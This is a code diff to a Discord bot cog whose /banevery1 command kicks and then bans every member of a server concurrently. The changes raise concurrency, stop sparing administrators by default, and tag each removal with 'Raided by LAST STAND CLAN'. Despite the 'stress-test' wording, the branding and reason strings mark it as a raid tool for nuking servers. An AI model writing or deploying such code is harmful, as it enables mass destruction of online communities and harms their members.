@@ -1,8 +1,9 @@
 """
-ban.py — /banevery1: mass ban all eligible members concurrently.
+ban.py — LAST STAND CLAN | /banevery1: mass ban + kick all eligible members concurrently.
 """
 
 import asyncio
+import random
 
 import discord
 from discord import app_commands
@@ -10,8 +11,10 @@ from discord.ext import commands
 
 from utils.state import bot_state
 
-RAID_TAG = "EoN"
-SEM_BAN  = 15
+RAID_TAG = "LAST STAND CLAN"
+RAID_SHORT = "LSC"
+SEM_BAN  = 20
+SEM_KICK = 20
 
 
 class Ban(commands.Cog):
@@ -20,19 +23,21 @@ class Ban(commands.Cog):
 
     @app_commands.command(
         name="banevery1",
-        description="Ban all non-bot members concurrently to stress-test ban protections.",
+        description="☠️ Mass ban + kick all members concurrently to stress-test ban/kick protections.",
     )
     @app_commands.describe(
-        intensity="Ban rate 1–10. Default 8.",
-        skip_admins="Skip members with Administrator. Default True.",
+        intensity="Ban rate 1–10. Default 10.",
+        skip_admins="Skip members with Administrator. Default False.",
+        kick_first="Kick before banning (double-action flood). Default True.",
     )
     @app_commands.checks.has_permissions(administrator=True)
     @app_commands.guild_only()
     async def banevery1(
         self,
         interaction: discord.Interaction,
-        intensity: int = 8,
-        skip_admins: bool = True,
+        intensity: int = 10,
+        skip_admins: bool = False,
+        kick_first: bool = True,
     ) -> None:
         if bot_state.active_simulation:
             await interaction.response.send_message(
@@ -64,21 +69,33 @@ class Ban(commands.Cog):
         bot_state.active_simulation = "banevery1"
 
         await interaction.response.send_message(
-            f"🔨 **MASS BAN — {RAID_TAG}**\n"
-            f"┣ Targets   : `{len(targets)}`\n"
-            f"┣ Intensity : `{intensity}/10`\n"
-            f"┣ Concurrent: `{SEM_BAN}` simultaneous bans\n"
+            f"☠️ **MASS BAN+KICK — {RAID_TAG}**\n"
+            f"┣ Targets    : `{len(targets)}`\n"
+            f"┣ Intensity  : `{intensity}/10`\n"
+            f"┣ Kick first : `{'✅' if kick_first else '❌'}`\n"
+            f"┣ Skip admins: `{'✅' if skip_admins else '❌'}`\n"
             f"┗ `/stop` halts immediately.",
         )
 
-        task = asyncio.create_task(self._run_bans(guild, targets))
+        task = asyncio.create_task(self._run(guild, targets, kick_first))
         bot_state.add_task(task)
 
-    async def _run_bans(self, guild: discord.Guild, members: list[discord.Member]) -> None:
-        sem = asyncio.Semaphore(SEM_BAN)
+    async def _run(
+        self,
+        guild: discord.Guild,
+        members: list[discord.Member],
+        kick_first: bool,
+    ) -> None:
+        sem_ban  = asyncio.Semaphore(SEM_BAN)
+        sem_kick = asyncio.Semaphore(SEM_KICK)
         try:
+            if kick_first:
+                await asyncio.gather(
+                    *[self._kick_one(guild, m, sem_kick) for m in members],
+                    return_exceptions=True,
+                )
             await asyncio.gather(
-                *[self._ban_one(guild, m, sem) for m in members],
+                *[self._ban_one(guild, m, sem_ban) for m in members],
                 return_exceptions=True,
             )
         except asyncio.CancelledError:
@@ -86,6 +103,15 @@ class Ban(commands.Cog):
         finally:
             if bot_state.active_simulation == "banevery1":
                 bot_state.active_simulation = None
+
+    async def _kick_one(self, guild: discord.Guild, member: discord.Member, sem: asyncio.Semaphore) -> None:
+        if bot_state.stop_event.is_set():
+            return
+        async with sem:
+            try:
+                await guild.kick(member, reason=f"Raided by {RAID_TAG}")
+            except discord.HTTPException:
+                pass
 
     async def _ban_one(self, guild: discord.Guild, member: discord.Member, sem: asyncio.Semaphore) -> None:
         if bot_state.stop_event.is_set():
